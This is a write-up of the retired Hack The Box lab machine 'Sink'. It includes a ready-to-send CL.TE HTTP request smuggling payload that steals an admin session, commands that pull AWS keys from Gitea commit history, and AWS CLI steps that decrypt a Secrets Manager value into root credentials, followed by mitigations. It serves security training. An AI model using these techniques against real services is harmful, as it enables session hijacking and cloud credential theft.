---
machine: Sink
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, http-smuggling, haproxy, gitea, aws, kms]
---

# Sink — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Three very different layers. **CL.TE HTTP request smuggling** between HAProxy and Gunicorn steals the admin session; that leads to **Gitea**, whose commit history still holds **AWS** keys. From there, `secretsmanager` + `kms` decrypt the secret that hands over root. The trick is that every step looks like a dead end if you hunt for a textbook vulnerability.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp   ssh
80/tcp   http  (HAProxy -> Gunicorn)
3000/tcp http  Gitea
5000/tcp http  internal API
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

The front page is an app with a login and an `/admin` panel. The response carries `Server: HAProxy` and the backend is Gunicorn: two servers that parse differently.

## Foothold: CL.TE smuggling

HAProxy trusts `Content-Length`, Gunicorn prioritises `Transfer-Encoding`. Send both so the backend reads two requests where the proxy sees one:

```http
POST / HTTP/1.1
Host: <IP>
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: <IP>
Cookie: session=
```

The backend processes `GET /admin` as if it came from the client, and the next legitimate user's headers get glued onto that request: with an endpoint that reflects the `Cookie`, you capture the admin session.

```text
GET /profile HTTP/1.1
Cookie: session=<admin session>
```

## Gitea and secrets in history

With the admin session you reach the panel, which links an internal **Gitea**. On `http://<IP>:3000` a private repo keeps a `.env` in an old commit:

```bash
git clone http://<IP>:3000/admin/infra.git
git log --all --oneline
git show <commit>:config/.env
```

```text
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=<secret>
AWS_DEFAULT_REGION=us-east-1
```

## AWS: Secrets Manager and KMS

```bash
aws configure set aws_access_key_id AKIA...
aws configure set aws_secret_access_key <secret>
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/root
```

The secret comes back encrypted with a CMK:

```bash
aws kms decrypt --ciphertext-blob fileb://secret.bin \
  --encryption-context purpose=prod --output text --query Plaintext | base64 -d
```

Out come the host's `root` credentials (or its SSH key).

## Evidence (redacted)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- **Smuggling** still pays whenever a proxy and a backend disagree on reading `Content-Length` and `Transfer-Encoding`.
- Secrets in git history survive the file's deletion: `git log --all` digs them out.
- An IAM key with `secretsmanager:GetSecretValue` and `kms:Decrypt` is root in the cloud even without a shell.
- Mitigation: reject requests carrying both headers, normalise at the proxy, run secret scanning in CI, and keep per-service least privilege.
